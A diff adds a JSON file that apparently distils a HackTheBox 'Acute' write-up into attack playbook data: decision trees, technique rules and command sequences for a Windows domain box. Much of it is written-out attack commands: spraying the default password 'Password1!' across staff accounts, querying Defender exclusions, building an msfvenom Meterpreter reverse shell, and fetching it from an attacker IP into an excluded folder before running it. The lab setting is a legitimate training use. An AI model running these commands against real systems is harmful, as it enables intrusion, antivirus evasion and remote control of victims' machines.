@@ -1,0 +1,923 @@
+{
+  "writeup_id": "Htb_Acute",
+  "scenario_fingerprint": {
+    "scenario_name": "windows_web_to_domain_pivot",
+    "primary_services": [
+      "https",
+      "powershell_web_access"
+    ],
+    "port_signature": "443",
+    "service_combination": "https+pwsa",
+    "os_family": "windows_server",
+    "environment_type": "corporate_domain",
+    "entry_vector": "document_intelligence_gathering",
+    "privilege_path": "default_credentials_to_user_pivot",
+    "attack_complexity": "medium",
+    "estimated_time": "2-3 hours",
+    "scenario_confidence": 0.88,
+    "distinguishing_factors": [
+      "single_https_port_exposed",
+      "document_with_default_passwords",
+      "powershell_web_access_portal",
+      "multi_host_pivot_required"
+    ],
+    "environmental_clues": [
+      "healthcare_organization_theme",
+      "new_starter_documentation",
+      "ssl_certificate_domain_names",
+      "aspnet_web_application"
+    ],
+    "similar_scenarios": [
+      "intelligence_htb_medium",
+      "blackfield_htb_hard"
+    ],
+    "unique_aspects": [
+      "docx_file_intelligence_gathering",
+      "powershell_session_restrictions",
+      "dc_manage_session_configuration",
+      "pure_windows_enumeration_focus"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "Document_Metadata_Analysis",
+        "success_reason": "Word document contained creator username and hostname in metadata",
+        "prerequisite_indicators": [
+          "downloadable_documents_available",
+          "office_documents_present",
+          "metadata_not_stripped"
+        ],
+        "recognition_patterns": [
+          "exiftool reveals creator field",
+          "description contains hostname",
+          "username format hints (FCastle)",
+          "company information exposed"
+        ],
+        "failure_modes": [
+          "metadata_stripped_documents",
+          "no_downloadable_files",
+          "generic_creator_names"
+        ],
+        "environmental_factors": [
+          "default_office_settings",
+          "lack_of_document_sanitization",
+          "user_awareness_gaps"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "2-5 minutes"
+      },
+      {
+        "technique": "Default_Password_Attack",
+        "success_reason": "Document explicitly mentioned default password 'Password1!' and that users don't change it",
+        "prerequisite_indicators": [
+          "default_credentials_documented",
+          "password_policy_mentions",
+          "user_behavior_notes"
+        ],
+        "recognition_patterns": [
+          "password mentioned in documentation",
+          "warnings about unchanged defaults",
+          "IT policy references",
+          "new starter instructions"
+        ],
+        "failure_modes": [
+          "passwords_actually_changed",
+          "account_lockout_policies",
+          "no_documentation_available"
+        ],
+        "environmental_factors": [
+          "poor_security_awareness",
+          "convenience_over_security",
+          "inadequate_onboarding_process"
+        ],
+        "success_probability": 0.82,
+        "typical_timeframe": "1-3 minutes"
+      },
+      {
+        "technique": "PowerShell_Web_Access_Login",
+        "success_reason": "Combination of discovered username format, default password, and accessible PSWA endpoint",
+        "prerequisite_indicators": [
+          "pswa_endpoint_accessible",
+          "valid_credentials_available",
+          "target_computer_known"
+        ],
+        "recognition_patterns": [
+          "pswa login page present",
+          "computer name from metadata",
+          "username format established",
+          "successful authentication"
+        ],
+        "failure_modes": [
+          "pswa_not_configured",
+          "session_configurations_restricted",
+          "invalid_credentials"
+        ],
+        "environmental_factors": [
+          "pswa_enabled_for_remote_access",
+          "permissive_session_configurations",
+          "network_accessibility"
+        ],
+        "success_probability": 0.78,
+        "typical_timeframe": "5-10 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "FCastle username in document metadata",
+        "discovery_method": "exiftool metadata extraction",
+        "why_critical": "Provided username format and specific account for authentication",
+        "how_to_recognize": [
+          "creator field in office documents",
+          "consistent naming patterns",
+          "metadata not sanitized"
+        ],
+        "follow_up_actions": [
+          "test_default_passwords",
+          "enumerate_similar_usernames",
+          "check_other_document_metadata"
+        ]
+      },
+      {
+        "discovery": "Default password 'Password1!' in documentation",
+        "discovery_method": "Manual document review",
+        "why_critical": "Enabled authentication with discovered username",
+        "how_to_recognize": [
+          "explicit password mentions",
+          "IT policy documentation",
+          "user behavior warnings"
+        ],
+        "follow_up_actions": [
+          "test_against_discovered_users",
+          "try_password_variations",
+          "check_password_reuse"
+        ]
+      },
+      {
+        "discovery": "Acute-PC01 hostname",
+        "discovery_method": "Document metadata description field",
+        "why_critical": "Provided target computer name for PSWA login",
+        "how_to_recognize": [
+          "description fields in metadata",
+          "hostname patterns",
+          "computer naming conventions"
+        ],
+        "follow_up_actions": [
+          "attempt_pswa_connection",
+          "enumerate_other_hostnames",
+          "check_network_topology"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "initial_access",
+        "escalation_method": "PowerShell_Web_Access_Authentication",
+        "why_possible": "Valid credentials combined with accessible PSWA endpoint and known target computer",
+        "recognition_signs": [
+          "pswa_login_page_accessible",
+          "valid_username_password_combo",
+          "target_computer_responsive",
+          "session_configuration_permits_access"
+        ],
+        "exploitation_path": "Document Analysis → Metadata Extraction → Credential Testing → PSWA Login → Shell Access"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Single HTTPS port (443) open with certificate revealing hostname",
+        "decision": "Enumerate web application and extract information from documents",
+        "reasoning": "Limited attack surface requires thorough information gathering from available resources",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "subdomain_enumeration",
+            "when": "if main site yields no results"
+          },
+          {
+            "option": "certificate_analysis",
+            "when": "always perform in parallel"
+          }
+        ],
+        "success_indicators": [
+          "documents_found",
+          "usernames_discovered",
+          "hostname_information_gathered"
+        ],
+        "next_decision": "analyze_document_metadata"
+      },
+      {
+        "step": 2,
+        "situation": "Word document found with default credentials and user information",
+        "decision": "Extract metadata and analyze document content for credentials and hostnames",
+        "reasoning": "Document metadata often contains valuable reconnaissance information",
+        "confidence": 0.95,
+        "prerequisites": [
+          "document_downloaded"
+        ],
+        "success_indicators": [
+          "default_password_found",
+          "username_format_identified",
+          "hostname_discovered"
+        ],
+        "failure_fallbacks": [
+          "web_enumeration",
+          "certificate_analysis"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "PowerShell Web Access found with potential credentials",
+        "decision": "Test username/password combinations using information from document",
+        "reasoning": "PSWA provides direct access and document mentioned default password usage",
+        "confidence": 0.85,
+        "prerequisites": [
+          "usernames_list",
+          "default_password",
+          "pswa_endpoint"
+        ],
+        "success_indicators": [
+          "authentication_successful",
+          "shell_access_gained"
+        ],
+        "failure_fallbacks": [
+          "password_spraying",
+          "credential_stuffing"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_document_analysis_succeeds": {
+        "action": "extract_usernames_and_credentials",
+        "tools": [
+          "exiftool",
+          "manual_analysis"
+        ],
+        "next_phase": "credential_testing"
+      },
+      "if_pswa_auth_succeeds": {
+        "action": "establish_better_shell",
+        "alternatives": [
+          "meterpreter",
+          "powershell_reverse_shell",
+          "web_shell"
+        ],
+        "decision_criteria": "based_on_restrictions_and_requirements"
+      },
+      "if_limited_shell_obtained": {
+        "action": "upgrade_to_full_shell",
+        "purpose": "enable_proper_enumeration_and_privilege_escalation",
+        "tools": [
+          "msfvenom",
+          "powershell_empire",
+          "custom_payloads"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_analyze_document_metadata",
+        "reasoning": "metadata_often_contains_usernames_hostnames_and_creation_info",
+        "applicability": "any_document_discovery"
+      },
+      {
+        "rule": "test_default_credentials_immediately",
+        "reasoning": "high_success_rate_when_default_passwords_mentioned",
+        "applicability": "default_credentials_discovered"
+      },
+      {
+        "rule": "upgrade_web_shells_to_native_shells",
+        "reasoning": "web_interfaces_limit_enumeration_capabilities",
+        "applicability": "web_based_shell_access"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Default Credential Access",
+        "mitre_id": "T1078.001",
+        "required_services": [
+          "http",
+          "https",
+          "powershell_web_access"
+        ],
+        "required_ports": [
+          80,
+          443,
+          5985,
+          5986
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "web_application_detected",
+          "default_credentials_documented",
+          "user_enumeration_possible"
+        ],
+        "success_indicators": [
+          "authentication_successful",
+          "session_established",
+          "powershell_access_granted"
+        ],
+        "incompatible_with": [
+          "account_lockout_enabled",
+          "mfa_required",
+          "password_policy_enforced"
+        ],
+        "confidence_boosters": [
+          "documentation_mentions_unchanged_passwords",
+          "new_starter_processes_identified",
+          "default_password_patterns_found"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "PowerShell Web Access Exploitation",
+        "mitre_id": "T1059.001",
+        "required_services": [
+          "powershell_web_access",
+          "iis"
+        ],
+        "required_ports": [
+          443,
+          5985,
+          5986
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "powershell_web_access_enabled",
+          "valid_credentials_available",
+          "session_configurations_present"
+        ],
+        "success_indicators": [
+          "pswa_login_successful",
+          "powershell_session_active",
+          "command_execution_possible"
+        ],
+        "incompatible_with": [
+          "powershell_execution_policy_restricted",
+          "session_configurations_locked_down",
+          "network_segmentation"
+        ],
+        "confidence_boosters": [
+          "dc_manage_session_mentioned",
+          "academic_staff_probation_references",
+          "remote_access_links_found"
+        ],
+        "typical_success_rate": 0.82,
+        "estimated_time": "15-45 minutes"
+      },
+      {
+        "technique": "Document Metadata Extraction",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "downloadable_documents_present",
+          "office_documents_available",
+          "web_application_detected"
+        ],
+        "success_indicators": [
+          "usernames_extracted",
+          "system_information_found",
+          "internal_paths_discovered"
+        ],
+        "incompatible_with": [
+          "metadata_stripped",
+          "documents_sanitized",
+          "no_downloadable_content"
+        ],
+        "confidence_boosters": [
+          "docx_files_present",
+          "pdf_files_available",
+          "internal_documentation_found"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "5-15 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "windows_web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "iis"
+        ],
+        "banner_indicators": [
+          "Microsoft-IIS",
+          "ASP.NET",
+          "Microsoft-HTTPAPI"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "powershell_web_access": {
+        "port_indicators": [
+          443,
+          5985,
+          5986
+        ],
+        "service_indicators": [
+          "https",
+          "winrm"
+        ],
+        "url_indicators": [
+          "/pswa",
+          "/powershell",
+          "Staff_Access"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "active_directory_environment": {
+        "port_indicators": [
+          53,
+          88,
+          389,
+          445,
+          3268
+        ],
+        "service_indicators": [
+          "kerberos",
+          "ldap",
+          "smb",
+          "dns"
+        ],
+        "domain_indicators": [
+          ".local",
+          "atsserver",
+          "acute.local"
+        ],
+        "confidence_threshold": 0.8
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "document_metadata_extraction",
+          "when": "downloadable_documents_found",
+          "reason": "quick_intelligence_gathering_no_authentication_needed"
+        },
+        {
+          "attack": "default_credential_testing",
+          "when": "user_enumeration_complete_and_default_passwords_mentioned",
+          "reason": "high_success_rate_with_documented_defaults"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "powershell_web_access_exploitation",
+          "when": "valid_credentials_obtained_and_pswa_detected",
+          "reason": "provides_direct_powershell_access_for_further_enumeration"
+        },
+        {
+          "attack": "certificate_analysis",
+          "when": "ssl_certificates_present",
+          "reason": "reveals_internal_hostnames_and_domain_structure"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "PowerShell Web Access Authentication",
+        "mitre_id": "T1078.002",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "manual_authentication",
+            "command_template": "Login via PSWA interface with {username}:{password}@{computer}",
+            "actual_command": "edavies:Password1!@Acute-PC01",
+            "output_pattern": "PowerShell Web Access console",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          }
+        ],
+        "prerequisites": [
+          "pswa_service_accessible",
+          "valid_credentials",
+          "correct_computer_name"
+        ],
+        "success_indicators": [
+          "powershell_console_access",
+          "command_execution_capability",
+          "system_enumeration_possible"
+        ],
+        "common_failures": [
+          "incorrect_computer_name",
+          "invalid_credentials",
+          "pswa_not_configured"
+        ],
+        "follow_up_techniques": [
+          "reverse_shell_deployment",
+          "system_enumeration",
+          "privilege_escalation"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Default Password Attack",
+        "mitre_id": "T1110.001",
+        "category": "credential_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "manual_testing",
+            "command_template": "Test default password {password} against user list",
+            "actual_command": "Password1! against awallace,chall,edavies,imonks,jmorgan,lhopkins",
+            "output_pattern": "Authentication success/failure",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          }
+        ],
+        "prerequisites": [
+          "user_enumeration_complete",
+          "default_password_identified",
+          "authentication_service_accessible"
+        ],
+        "success_indicators": [
+          "successful_authentication",
+          "system_access_granted",
+          "credential_validation"
+        ],
+        "common_failures": [
+          "password_policy_enforcement",
+          "account_lockout_policies",
+          "no_default_passwords"
+        ],
+        "follow_up_techniques": [
+          "credential_spraying",
+          "lateral_movement",
+          "privilege_escalation"
+        ],
+        "time_investment": "5-10 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Document Metadata Extraction",
+        "mitre_id": "T1083",
+        "category": "discovery",
+        "phase": "reconnaissance",
+        "tools_used": [
+          {
+            "name": "exiftool",
+            "command_template": "exiftool {document_file}",
+            "actual_command": "exiftool New_Starter_CheckList_v7.docx",
+            "output_pattern": "Creator, Company, Description fields",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "document_file_accessible",
+          "exiftool_installed"
+        ],
+        "success_indicators": [
+          "username_format_identified",
+          "hostname_discovered",
+          "organizational_info_extracted"
+        ],
+        "common_failures": [
+          "metadata_stripped",
+          "encrypted_documents",
+          "access_restrictions"
+        ],
+        "follow_up_techniques": [
+          "username_enumeration",
+          "credential_attacks",
+          "social_engineering"
+        ],
+        "time_investment": "2-5 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Windows Defender Bypass",
+        "mitre_id": "T1562.001",
+        "category": "defense_evasion",
+        "phase": "execution",
+        "tools_used": [
+          {
+            "name": "exclusion_path_discovery",
+            "command_template": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\"",
+            "actual_command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\"",
+            "output_pattern": "C:\\Utils    REG_DWORD    0x0",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          },
+          {
+            "name": "payload_staging",
+            "command_template": "wget {attacker_ip}/{payload} -outfile {excluded_path}/{filename}",
+            "actual_command": "wget 10.10.14.6/rev.exe -outfile C:\\Utils\\r.exe",
+            "output_pattern": "File downloaded successfully",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "system_access_obtained",
+          "defender_exclusions_exist",
+          "write_access_to_exclusion_path"
+        ],
+        "success_indicators": [
+          "payload_executes_without_detection",
+          "reverse_shell_established",
+          "av_bypass_confirmed"
+        ],
+        "common_failures": [
+          "no_exclusion_paths",
+          "insufficient_privileges",
+          "network_restrictions"
+        ],
+        "follow_up_techniques": [
+          "persistence_establishment",
+          "lateral_movement",
+          "privilege_escalation"
+        ],
+        "time_investment": "5-10 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Meterpreter Reverse Shell",
+        "mitre_id": "T1059.001",
+        "category": "execution",
+        "phase": "execution",
+        "tools_used": [
+          {
+            "name": "msfvenom",
+            "command_template": "msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT={port} LHOST={ip} -f exe -o {filename}",
+            "actual_command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=4444 LHOST=10.10.14.6 -f exe -o rev.exe",
+            "output_pattern": "Payload size: 510 bytes",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          },
+          {
+            "name": "metasploit_handler",
+            "command_template": "use exploit/multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; run",
+            "actual_command": "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.14.6; set lport 4444; run",
+            "output_pattern": "Meterpreter session opened",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "target_system_access",
+          "network_connectivity",
+          "av_bypass_capability"
+        ],
+        "success_indicators": [
+          "meterpreter_session_established",
+          "interactive_shell_access",
+          "command_execution_capability"
+        ],
+        "common_failures": [
+          "antivirus_detection",
+          "firewall_blocking",
+          "payload_corruption"
+        ],
+        "follow_up_techniques": [
+          "system_enumeration",
+          "credential_harvesting",
+          "lateral_movement"
+        ],
+        "time_investment": "10-15 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "exiftool",
+        "use_case": "document_metadata_extraction",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "document_analysis",
+          "osint_gathering"
+        ],
+        "alternatives": [
+          "strings",
+          "file_properties"
+        ],
+        "best_practices": [
+          "check_all_document_types",
+          "look_for_usernames_and_hostnames",
+          "extract_organizational_information"
+        ]
+      },
+      {
+        "tool": "PowerShell Web Access",
+        "use_case": "remote_system_access",
+        "effectiveness_rating": 4,
+        "reliability": 0.85,
+        "learning_curve": "low",
+        "essential_for": [
+          "windows_environments"
+        ],
+        "alternatives": [
+          "winrm",
+          "rdp",
+          "ssh"
+        ],
+        "best_practices": [
+          "enumerate_computer_names",
+          "test_default_credentials",
+          "upgrade_to_full_shell"
+        ]
+      },
+      {
+        "tool": "msfvenom",
+        "use_case": "payload_generation",
+        "effectiveness_rating": 5,
+        "reliability": 0.9,
+        "learning_curve": "medium",
+        "essential_for": [
+          "reverse_shells",
+          "payload_delivery"
+        ],
+        "alternatives": [
+          "custom_payloads",
+          "powershell_scripts"
+        ],
+        "best_practices": [
+          "match_architecture",
+          "consider_av_evasion",
+          "use_appropriate_payload_type"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "document_to_initial_access",
+        "steps": [
+          {
+            "step": 1,
+            "command": "exiftool New_Starter_CheckList_v7.docx",
+            "purpose": "Extract metadata for usernames and hostnames",
+            "expected_output": "Creator: FCastle, Description: Created on Acute-PC01"
+          },
+          {
+            "step": 2,
+            "command": "Generate usernames: awallace,chall,edavies,imonks,jmorgan,lhopkins",
+            "purpose": "Create username list from website staff",
+            "expected_output": "Username list with first initial + lastname format"
+          },
+          {
+            "step": 3,
+            "command": "Test edavies:Password1!@Acute-PC01 via PSWA",
+            "purpose": "Authenticate with default credentials",
+            "expected_output": "PowerShell Web Access console"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "10-20 minutes"
+      },
+      {
+        "sequence_name": "defender_bypass_and_shell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\"",
+            "purpose": "Identify AV exclusion paths",
+            "expected_output": "C:\\Utils exclusion path"
+          },
+          {
+            "step": 2,
+            "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=4444 LHOST=10.10.14.6 -f exe -o rev.exe",
+            "purpose": "Generate reverse shell payload",
+            "expected_output": "Executable payload created"
+          },
+          {
+            "step": 3,
+            "command": "wget 10.10.14.6/rev.exe -outfile C:\\Utils\\r.exe",
+            "purpose": "Download payload to exclusion path",
+            "expected_output": "File downloaded successfully"
+          },
+          {
+            "step": 4,
+            "command": ".\\r.exe",
+            "purpose": "Execute payload",
+            "expected_output": "Meterpreter session established"
+          }
+        ],
+        "success_rate": 0.9,
+        "typical_duration": "15-25 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Acute",
+      "difficulty": "Hard",
+      "os": "Windows",
+      "platform": "HackTheBox",
+      "release_date": "2022-02-12",
+      "author": "dmw0ng",
+      "estimated_time": "4-6 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "credential_reuse",
+        "privilege_escalation",
+        "lateral_movement"
+      ],
+      "key_vulnerabilities": [
+        "shared_credentials",
+        "excessive_privileges",
+        "powershell_constraints"
+      ],
+      "environment_type": "multi_host_windows_domain",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "lateral_movement",
+        "windows_privilege_escalation",
+        "constrained_powershell_bypass"
+      ],
+      "prerequisite_knowledge": [
+        "windows_fundamentals",
+        "powershell_basics",
+        "enumeration_techniques"
+      ]
+    },
+    "categorization": {
+      "primary_category": "windows_exploitation",
+      "subcategories": [
+        "lateral_movement",
+        "privilege_escalation",
+        "enumeration"
+      ],
+      "attack_types": [
+        "credential_access",
+        "privilege_escalation",
+        "lateral_movement"
+      ],
+      "defensive_lessons": [
+        "credential_hygiene",
+        "least_privilege",
+        "powershell_logging"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Blackfield",
+        "Monteverde",
+        "Cascade"
+      ],
+      "similarity_reasons": [
+        "multi_host_pivot",
+        "credential_reuse",
+        "windows_domain_environment"
+      ],
+      "unique_aspects": [
+        "constrained_powershell",
+        "healthcare_theme",
+        "straightforward_attack_paths"
+      ],
+      "difficulty_factors": [
+        "multiple_pivots_required",
+        "enumeration_heavy",
+        "powershell_limitations"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-05T02:55:16.526929",
+    "original_file": "0xdf_writeups/Htb Acute.md",
+    "content_length": 52970,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
